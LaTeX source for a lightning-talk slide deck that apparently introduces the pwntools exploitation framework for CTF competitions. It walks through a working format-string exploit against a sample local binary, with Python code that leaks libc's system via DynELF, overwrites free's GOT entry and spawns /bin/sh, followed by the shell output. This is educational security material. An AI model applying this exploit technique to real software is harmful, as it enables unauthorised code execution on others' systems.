\documentclass[t]{beamer}
\usepackage[utf8]{inputenc}
\usepackage[danish]{babel}
\usepackage{hyperref}

\usepackage{listings}

\lstdefinestyle{customc}{
  belowcaptionskip=1\baselineskip,
  breaklines=true,
  xleftmargin=\parindent,
  language=C,
  showstringspaces=false,
  basicstyle=\footnotesize\ttfamily,
  keywordstyle=\bfseries\color{green!40!black},
  commentstyle=\itshape\color{purple!40!black},
  identifierstyle=\color{blue},
  stringstyle=\color{orange},
}

\lstdefinestyle{custompy}{
  belowcaptionskip=1\baselineskip,
  breaklines=true,
  xleftmargin=\parindent,
  language=C,
  showstringspaces=false,
  basicstyle=\footnotesize\ttfamily,
  keywordstyle=\bfseries\color{green!40!black},
  commentstyle=\itshape\color{purple!40!black},
  identifierstyle=\color{blue},
  stringstyle=\color{orange},
}

\title{Short and confusing introduction to Pwntools}
\author{Kokjo / Jonas Rudloff}

\begin{document}
\frame[plain]{\titlepage}

\begin{frame}
    \frametitle{What is pwntools?}
    \begin{itemize}
        \pause \item Pwntools is exploitation framework
        \pause \item For rapidly developing exploits.
        \pause \item Eg. for CTF competitions
        \pause \item Originally developed at the student organization Pwnies at DIKU
        \item With a lot of help from Zach Riggle(@ebeip90)
        \pause \item https://github.com/Gallopsled/pwntools
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Sample pwnable program}
    \lstinputlisting[language=C,style=customc]{../pwnable.c}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Exploitation with Pwntools!}
    We are going the attack the format string bug in the program,
    \pause but first we need to be able to interact with the program
    \pause
    \begin{lstlisting}[language=Python, style=custompy]
    from pwn import *
    r = process("./pwnable")
    r.interactive()
    \end{lstlisting}
    \pause Yay!
\end{frame}

\begin{frame}[fragile]
    \frametitle{Exploitation plan}
    \begin{itemize}
        \pause \item Leak address of \texttt{system}
        \pause \item ... change the got entry of \texttt{free} to be the address of \texttt{system}
        \pause \item ... and choose our name to be \texttt{/bin/sh}
    \end{itemize}
    \pause
    \begin{lstlisting}[language=Python, style=custompy]
 from pwn import *
 r = process("./pwnable")
 r.sendlineafter("What's your name?", "/bin/sh")
    \end{lstlisting}
    \pause and we can call printf like
    \begin{lstlisting}[language=Python, style=custompy]
 @FmtStr
 def printf(s):
     r.sendline(s)
     return r.recvuntil("today?\n", drop=True)
    \end{lstlisting}
    \texttt{FmtStr} is pwntools magic,
    \pause which escalates a format string vulnerability to a full memory leaker,
    \pause and a write-what-where.
    \pause Using standard format string techniques.
\end{frame}

\begin{frame}[fragile]
    \frametitle{Leaking the address of \texttt{system}}
    \pause Idea:
    \begin{itemize}
            \pause \item Do what the dynamic linker would do!
            \pause \item We will use our memory leaker!
            \pause \item Do pointer chasing and hashtable lookups inside ELF files.
            \pause \item Pwntools have built-in support for this: DynELF!!
    \end{itemize}
    \begin{lstlisting}[language=python, style=custompy]
 e = ELF("./pwnable")
 d = DynELF(printf.leaker, elf=e)
 system = d.lookup("system", "libc.so")
    \end{lstlisting}
    \pause
    The variable \texttt{system} now contains the address of \texttt{system} inside the running process \texttt{./pwnable}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Overwriting the GOT entry of \texttt{free}}
    \pause Easy!!!
    \pause We will just use the format string exploit again!
    \pause
    \begin{lstlisting}[language=Python, style=custompy]
 printf.write(e.got["free"], system)
 printf.execute_writes()
    \end{lstlisting}
    \pause
    What is left is just to call free, and we are done!
    \pause
    \begin{lstlisting}[language=Python, style=custompy]
 r.sendline("quit") #Trigger, call system("/bin/sh")
 r.clean()
 r.interactive()
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
    \begin{lstlisting}[style=custompy]
[+] Opening connection to localhost on port 1337: Done
[*] Found format string offset: 7
[*] '/home/jonas/code/lightning-talk-33c3/pwnable'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
[+] Loading from '/home/jonas/code/lightning-talk-33c3/pwnable': 0xf77be930
[+] Resolving 'system' in 'libc.so': 0xf77be930
[*] Switching to interactive mode
$ whoami
pwnable
$ cat flag
omglol, hello 33C3!!!
$ 
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Final exploit}
    \lstinputlisting[language=C,style=customc]{../doit.py}
\end{frame}

\begin{frame}[fragile]
    \frametitle{References}
    \begin{itemize}
        \item \url{http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf}
        \item \url{http://www.phrack.org/issues.html?issue=59&id=7}
        \item \url{http://docs.pwntools.com/en/stable/dynelf.html}
        \item \url{https://github.com/Gallopsled/pwntools}
    \end{itemize}
\end{frame}


\end{document}
